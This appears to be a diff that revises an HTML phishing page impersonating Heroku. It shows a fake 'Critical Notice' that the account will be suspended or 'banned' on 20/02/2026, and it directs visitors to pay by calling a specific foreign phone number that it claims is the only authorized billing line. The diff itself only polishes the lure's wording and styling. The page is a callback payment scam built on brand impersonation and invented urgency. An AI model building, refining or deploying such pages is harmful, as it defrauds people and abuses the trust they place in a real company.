@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Heroku | Dashboard</title>
+    <title>Heroku | Account Status</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
@@ -13,24 +13,16 @@
             color: #3f3f44;
         }
 
-        /* The Purple Warning Banner from the top of the image */
+        /* Heroku-style Purple Warning Banner */
         .urgent-banner {
             background-color: #79589f;
             color: #ffffff;
             text-align: center;
-            padding: 12px 10px;
-            font-size: 14px;
+            padding: 14px 10px;
+            font-size: 15px;
             font-weight: 500;
-            border-bottom: 2px solid #634683;
         }
 
-        .urgent-banner a {
-            color: #fff;
-            text-decoration: underline;
-            font-weight: bold;
-        }
-
-        /* Header mimic */
         .header {
             background: #fff;
             padding: 15px 20px;
@@ -46,10 +38,9 @@
             letter-spacing: 1px;
         }
 
-        /* Main Container */
         .container {
-            max-width: 600px;
-            margin: 40px auto;
+            max-width: 500px;
+            margin: 50px auto;
             padding: 0 20px;
         }
 
@@ -59,75 +50,67 @@
             border-radius: 6px;
             padding: 40px 30px;
             text-align: center;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
         }
 
         h2 {
             color: #430098;
-            font-size: 24px;
-            margin-top: 0;
-        }
-
-        .status-badge {
-            display: inline-block;
-            background: #fff0f0;
-            color: #d12d2d;
-            border: 1px solid #facccc;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 13px;
-            font-weight: bold;
+            font-size: 22px;
             margin-bottom: 20px;
         }
 
-        .message {
-            line-height: 1.6;
-            color: #58517e;
-            margin-bottom: 30px;
+        .date-highlight {
+            color: #d12d2d;
+            font-weight: bold;
+            font-size: 18px;
+            display: block;
+            margin: 10px 0;
         }
 
-        .billing-box {
-            background: #f8f9ff;
-            border: 1px solid #e1e1e8;
+        .billing-terminal {
+            background: #f4f4f9;
             border-radius: 4px;
             padding: 20px;
-            margin-bottom: 30px;
+            margin: 25px 0;
+            border-left: 4px solid #79589f;
         }
 
-        .billing-box strong {
+        .phone-display {
             display: block;
-            font-size: 18px;
+            font-size: 20px;
             color: #430098;
-            margin-top: 5px;
+            font-weight: bold;
+            margin-top: 8px;
         }
 
-        /* The Purple Button from the screenshot */
         .btn-pay {
             background-color: #79589f;
             color: white;
             text-decoration: none;
-            padding: 14px 30px;
+            padding: 16px 32px;
             border-radius: 4px;
             font-weight: 600;
             display: inline-block;
             transition: background 0.2s;
+            width: 80%;
         }
 
         .btn-pay:hover {
             background-color: #634683;
         }
 
-        .footer {
-            margin-top: 20px;
+        .disclaimer {
             font-size: 12px;
             color: #9b99af;
+            margin-top: 25px;
+            line-height: 1.4;
         }
     </style>
 </head>
 <body>
 
     <div class="urgent-banner">
-        Critical: Your account is scheduled for suspension <strong>Today at 00:00</strong>. <a href="#">Fix Now</a>
+        Critical Notice: Account suspension scheduled for <strong>20/02/2026</strong>.
     </div>
 
     <div class="header">
@@ -136,23 +119,20 @@
 
     <div class="container">
         <div class="card">
-            <div class="status-badge">PAYMENT OVERDUE</div>
-            <h2>Service Suspension Notice</h2>
+            <h2>Payment Required</h2>
             
-            <p class="message">
-                Your Heroku apps and pipelines are scheduled to be <strong>banned and suspended</strong> on 
-                <br><strong>20/02/2026 at 00:00</strong> due to unsuccessful payment processing.
-            </p>
+            <p>Your Heroku services are scheduled to be banned on:</p>
+            <span class="date-highlight">February 20, 2026</span>
 
-            <div class="billing-box">
-                Authorized Billing Access Only:
-                <strong>+255 610 274 920</strong>
+            <div class="billing-terminal">
+                Only this number has billing access:
+                <span class="phone-display">+255 610 274 920</span>
             </div>
 
-            <a href="tel:+255610274920" class="btn-pay">Pay to Prevent Suspension</a>
+            <a href="tel:+255610274920" class="btn-pay">Pay to Prevent Ban</a>
 
-            <div class="footer">
-                Only payments made to the authorized number above will clear this notice.
+            <div class="disclaimer">
+                Payment must be finalized through the authorized billing terminal above to clear the suspension flag from your account.
             </div>
         </div>
     </div>
